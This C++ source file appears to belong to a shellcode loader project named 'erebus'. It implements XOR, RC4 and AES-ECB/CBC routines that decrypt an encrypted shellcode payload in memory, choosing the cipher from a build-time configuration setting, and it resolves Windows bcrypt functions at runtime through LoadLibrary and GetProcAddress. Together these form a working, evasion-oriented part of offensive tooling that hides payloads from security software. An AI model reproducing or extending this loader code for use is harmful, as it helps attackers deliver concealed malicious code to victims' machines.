#include "../../include/loader.hpp"
#include <cstring>
#include <cwchar>

namespace erebus {
	#ifndef STATUS_SUCCESS
	#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
	#endif

	#ifndef NT_SUCCESS
	#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
	#endif

	static bool AesDecryptBCrypt(
		_Inout_ BYTE* input,
		IN SIZE_T inputLen,
		IN BYTE* key,
		IN SIZE_T keyLen,
		IN BYTE* iv,
		IN SIZE_T ivLen,
		IN LPCWSTR chainingMode)
	{
		if (!input || inputLen == 0 || !key || keyLen == 0)
		{
			LOG_ERROR("AES decrypt: invalid input or key");
			return false;
		}

		if (keyLen != 16 && keyLen != 24 && keyLen != 32)
		{
			LOG_ERROR("AES decrypt: key length must be 16, 24, or 32 bytes");
			return false;
		}

		if ((inputLen % 16) != 0)
		{
			LOG_ERROR("AES decrypt: input length must be a multiple of 16 bytes");
			return false;
		}

		HMODULE bcrypt = LoadLibraryA("bcrypt.dll");
		if (!bcrypt)
		{
			LOG_ERROR("AES decrypt: failed to load bcrypt.dll");
			return false;
		}

		auto pBCryptOpenAlgorithmProvider =
			(typeBCryptOpenAlgorithmProvider)GetProcAddress(bcrypt, "BCryptOpenAlgorithmProvider");
		auto pBCryptSetProperty =
			(typeBCryptSetProperty)GetProcAddress(bcrypt, "BCryptSetProperty");
		auto pBCryptDecrypt =
			(typeBCryptDecrypt)GetProcAddress(bcrypt, "BCryptDecrypt");
		auto pBCryptGenerateSymmetricKey =
			(typeBCryptGenerateSymmetricKey)GetProcAddress(bcrypt, "BCryptGenerateSymmetricKey");
		auto pBCryptCloseAlgorithmProvider =
			(typeBCryptCloseAlgorithmProvider)GetProcAddress(bcrypt, "BCryptCloseAlgorithmProvider");
		auto pBCryptDestroyKey =
			(typeBCryptDestroyKey)GetProcAddress(bcrypt, "BCryptDestroyKey");

		typedef NTSTATUS(WINAPI* typeBCryptGetProperty)(
			_In_ PVOID hObject,
			_In_ LPCWSTR pszProperty,
			_Out_writes_bytes_to_opt_(cbOutput, *pcbResult) PUCHAR pbOutput,
			_In_ ULONG cbOutput,
			_Out_ ULONG* pcbResult,
			_In_ ULONG dwFlags);

		auto pBCryptGetProperty =
			(typeBCryptGetProperty)GetProcAddress(bcrypt, "BCryptGetProperty");

		if (!pBCryptOpenAlgorithmProvider || !pBCryptSetProperty || !pBCryptDecrypt ||
			!pBCryptGenerateSymmetricKey || !pBCryptCloseAlgorithmProvider ||
			!pBCryptDestroyKey || !pBCryptGetProperty)
		{
			LOG_ERROR("AES decrypt: missing BCrypt function(s)");
			FreeLibrary(bcrypt);
			return false;
		}

		PVOID hAlg = nullptr;
		PVOID hKey = nullptr;
		PUCHAR keyObject = nullptr;
		PUCHAR ivCopy = nullptr;
		ULONG keyObjectLen = 0;
		ULONG cbResult = 0;
		ULONG outLen = 0;
		bool success = false;

		static const WCHAR kAesAlg[] = L"AES";
		static const WCHAR kChainingModeProp[] = L"ChainingMode";

		do
		{
			if (!NT_SUCCESS(pBCryptOpenAlgorithmProvider(&hAlg, kAesAlg, nullptr, 0)))
			{
				LOG_ERROR("AES decrypt: BCryptOpenAlgorithmProvider failed");
				break;
			}

			ULONG chainingModeLen = (ULONG)((wcslen(chainingMode) + 1) * sizeof(WCHAR));
			if (!NT_SUCCESS(pBCryptSetProperty(hAlg, kChainingModeProp,
				(PUCHAR)chainingMode, chainingModeLen, 0)))
			{
				LOG_ERROR("AES decrypt: BCryptSetProperty failed");
				break;
			}

			static const WCHAR kObjectLengthProp[] = L"ObjectLength";
			if (!NT_SUCCESS(pBCryptGetProperty(hAlg, kObjectLengthProp,
				(PUCHAR)&keyObjectLen, sizeof(ULONG), &cbResult, 0)))
			{
				LOG_ERROR("AES decrypt: BCryptGetProperty(ObjectLength) failed");
				break;
			}

			keyObject = (PUCHAR)HeapAlloc(keyObjectLen);
			if (!keyObject)
			{
				LOG_ERROR("AES decrypt: key object allocation failed");
				break;
			}

			if (!NT_SUCCESS(pBCryptGenerateSymmetricKey(hAlg, &hKey, keyObject,
				keyObjectLen, key, (ULONG)keyLen, 0)))
			{
				LOG_ERROR("AES decrypt: BCryptGenerateSymmetricKey failed");
				break;
			}

			if (iv && ivLen > 0)
			{
				ivCopy = (PUCHAR)HeapAlloc(ivLen);
				if (!ivCopy)
				{
					LOG_ERROR("AES decrypt: IV allocation failed");
					break;
				}
				memcpy(ivCopy, iv, ivLen);
			}

			if (!NT_SUCCESS(pBCryptDecrypt(hKey, input, (ULONG)inputLen, nullptr,
				ivCopy, (ULONG)ivLen, input, (ULONG)inputLen, &outLen, 0)))
			{
				LOG_ERROR("AES decrypt: BCryptDecrypt failed");
				break;
			}

			if (outLen != inputLen)
			{
				LOG_ERROR("AES decrypt: output length mismatch");
				break;
			}

			success = true;
		} while (false);

		if (ivCopy)
		{
			SecureZeroMemory(ivCopy, ivLen);
			HeapFree(ivCopy);
		}
		if (hKey)
		{
			pBCryptDestroyKey(hKey);
		}
		if (keyObject)
		{
			SecureZeroMemory(keyObject, keyObjectLen);
			HeapFree(keyObject);
		}
		if (hAlg)
		{
			pBCryptCloseAlgorithmProvider(hAlg, 0);
		}
		FreeLibrary(bcrypt);
		return success;
	}

	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		for (SIZE_T i = 0; i < InputLen; i++)
			Input[i] ^= Key[i % KeyLen];
		return;
	}

	VOID DecryptionRC4(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		BYTE S[256];
		BYTE temp;
		
		// KSA (Key Scheduling Algorithm)
		for (int i = 0; i < 256; i++)
			S[i] = i;
		
		int j = 0;
		for (int i = 0; i < 256; i++)
		{
			j = (j + S[i] + Key[i % KeyLen]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
		}
		
		// PRGA (Pseudo-Random Generation Algorithm)
		int i = 0;
		j = 0;
		for (SIZE_T k = 0; k < InputLen; k++)
		{
			i = (i + 1) % 256;
			j = (j + S[i]) % 256;
			temp = S[i];
			S[i] = S[j];
			S[j] = temp;
			Input[k] ^= S[(S[i] + S[j]) % 256];
		}
		return;
	}

	VOID DecryptionAES(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen)
	{
		static const WCHAR kChainModeEcb[] = L"ChainingModeECB";
		if (!AesDecryptBCrypt(Input, InputLen, Key, KeyLen, nullptr, 0, kChainModeEcb))
		{
			LOG_ERROR("AES-ECB decryption failed");
		}
		return;
	}

	VOID DecryptionAES_CBC(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen, IN BYTE* IV, IN SIZE_T IVLen)
	{
		static const WCHAR kChainModeCbc[] = L"ChainingModeCBC";
		if (!AesDecryptBCrypt(Input, InputLen, Key, KeyLen, IV, IVLen, kChainModeCbc))
		{
			LOG_ERROR("AES-CBC decryption failed");
		}
		return;
	}

	// ============================================================
	// CONFIG-BASED DECRYPTION ROUTINE
	// ============================================================
	// Decrypts shellcode based on CONFIG_ENCRYPTION_TYPE setting
	// ============================================================

// 	VOID DecryptShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen)
// 	{
// 		LOG_INFO("========================================");
// 		LOG_INFO("Shellcode Decryption (Config-Based)");
// 		LOG_INFO("========================================");

// 		// Validate input parameters
// 		if (!Shellcode || !*Shellcode || !ShellcodeLen || *ShellcodeLen == 0)
// 		{
// 			LOG_ERROR("Invalid shellcode pointer or size");
// 			return;
// 		}

// #if CONFIG_ENCRYPTION_TYPE == 0
// 		// No encryption
// 		LOG_INFO("[*] Encryption: NONE - skipping decryption");

// #elif CONFIG_ENCRYPTION_TYPE == 1
// 		// XOR encryption
// 		{
// 			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
// 			SIZE_T keyLen = sizeof(encryptionKey);

// 			if (keyLen > 0 && encryptionKey[0] != 0x00)
// 			{
// 				LOG_INFO("[*] Encryption: XOR");
// 				LOG_INFO("[+] Key size: %zu bytes", keyLen);
// 				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
// 				DecryptionXOR(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
// 				LOG_SUCCESS("XOR decryption complete: %zu bytes", *ShellcodeLen);
// 			}
// 			else
// 			{
// 				LOG_ERROR("XOR encryption configured but key is empty");
// 			}
// 		}

// #elif CONFIG_ENCRYPTION_TYPE == 2
// 		// RC4 encryption
// 		{
// 			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
// 			SIZE_T keyLen = sizeof(encryptionKey);

// 			if (keyLen > 0 && encryptionKey[0] != 0x00)
// 			{
// 				LOG_INFO("[*] Encryption: RC4");
// 				LOG_INFO("[+] Key size: %zu bytes", keyLen);
// 				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
// 				DecryptionRC4(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
// 				LOG_SUCCESS("RC4 decryption complete: %zu bytes", *ShellcodeLen);
// 			}
// 			else
// 			{
// 				LOG_ERROR("RC4 encryption configured but key is empty");
// 			}
// 		}

// #elif CONFIG_ENCRYPTION_TYPE == 3
// 		// AES-ECB encryption
// 		{
// 			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
// 			SIZE_T keyLen = sizeof(encryptionKey);

// 			if (keyLen > 0 && encryptionKey[0] != 0x00)
// 			{
// 				LOG_INFO("[*] Encryption: AES-ECB");
// 				LOG_INFO("[+] Key size: %zu bytes", keyLen);
// 				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
// 				DecryptionAES(*Shellcode, *ShellcodeLen, encryptionKey, keyLen);
// 				LOG_SUCCESS("AES-ECB decryption complete: %zu bytes", *ShellcodeLen);
// 			}
// 			else
// 			{
// 				LOG_ERROR("AES-ECB encryption configured but key is empty");
// 			}
// 		}

// #elif CONFIG_ENCRYPTION_TYPE == 4
// 		// AES-CBC encryption (requires IV)
// 		{
// 			BYTE encryptionKey[] = CONFIG_ENCRYPTION_KEY;
// 			BYTE encryptionIV[] = CONFIG_ENCRYPTION_IV;
// 			SIZE_T keyLen = sizeof(encryptionKey);
// 			SIZE_T ivLen = sizeof(encryptionIV);

// 			if (keyLen > 0 && encryptionKey[0] != 0x00 && ivLen == 16)
// 			{
// 				LOG_INFO("[*] Encryption: AES-CBC");
// 				LOG_INFO("[+] Key size: %zu bytes", keyLen);
// 				LOG_INFO("[+] IV size: %zu bytes", ivLen);
// 				LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
				
// 				// Note: CBC mode decryption would require additional CryptoAPI calls
// 				DecryptionAES_CBC(*Shellcode, *ShellcodeLen, encryptionKey, keyLen, encryptionIV, ivLen);
// 				LOG_SUCCESS("AES-CBC decryption complete: %zu bytes", *ShellcodeLen);
// 			}
// 			else
// 			{
// 				LOG_ERROR("AES-CBC encryption configured but key or IV is invalid");
// 			}
// 		}

// #else
// #error "Invalid CONFIG_ENCRYPTION_TYPE value"
// #endif

// 		LOG_INFO("========================================");
// 	}

	VOID DecryptShellcodeWithKeyAndIv(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen, _In_ BYTE* Key, _In_ SIZE_T KeyLen, _In_opt_ BYTE* IV, _In_opt_ SIZE_T IVLen)
	{
		LOG_INFO("========================================");
		LOG_INFO("Shellcode Decryption (Explicit Key/IV)");
		LOG_INFO("========================================");

		if (!Shellcode || !*Shellcode || !ShellcodeLen || *ShellcodeLen == 0)
		{
			LOG_ERROR("Invalid shellcode pointer or size");
			return;
		}

		if (!Key || KeyLen == 0)
		{
			LOG_ERROR("Invalid encryption key");
			return;
		}

#if CONFIG_ENCRYPTION_TYPE == 0
		LOG_INFO("[*] Encryption: NONE - skipping decryption");

#elif CONFIG_ENCRYPTION_TYPE == 1
		LOG_INFO("[*] Encryption: XOR");
		LOG_INFO("[+] Key size: %zu bytes", KeyLen);
		LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
		DecryptionXOR(*Shellcode, *ShellcodeLen, Key, KeyLen);
		LOG_SUCCESS("XOR decryption complete: %zu bytes", *ShellcodeLen);

#elif CONFIG_ENCRYPTION_TYPE == 2
		LOG_INFO("[*] Encryption: RC4");
		LOG_INFO("[+] Key size: %zu bytes", KeyLen);
		LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
		DecryptionRC4(*Shellcode, *ShellcodeLen, Key, KeyLen);
		LOG_SUCCESS("RC4 decryption complete: %zu bytes", *ShellcodeLen);

#elif CONFIG_ENCRYPTION_TYPE == 3
		LOG_INFO("[*] Encryption: AES-ECB");
		LOG_INFO("[+] Key size: %zu bytes", KeyLen);
		LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
		DecryptionAES(*Shellcode, *ShellcodeLen, Key, KeyLen);
		LOG_SUCCESS("AES-ECB decryption complete: %zu bytes", *ShellcodeLen);

#elif CONFIG_ENCRYPTION_TYPE == 4
		if (!IV || IVLen != 16)
		{
			LOG_ERROR("AES-CBC encryption configured but IV is invalid");
			return;
		}
		LOG_INFO("[*] Encryption: AES-CBC");
		LOG_INFO("[+] Key size: %zu bytes", KeyLen);
		LOG_INFO("[+] IV size: %zu bytes", IVLen);
		LOG_INFO("[+] Shellcode size: %zu bytes", *ShellcodeLen);
		DecryptionAES_CBC(*Shellcode, *ShellcodeLen, Key, KeyLen, IV, IVLen);
		LOG_SUCCESS("AES-CBC decryption complete: %zu bytes", *ShellcodeLen);

#else
#error "Invalid CONFIG_ENCRYPTION_TYPE value"
#endif

		LOG_INFO("========================================");
	}
} // namespace erebus
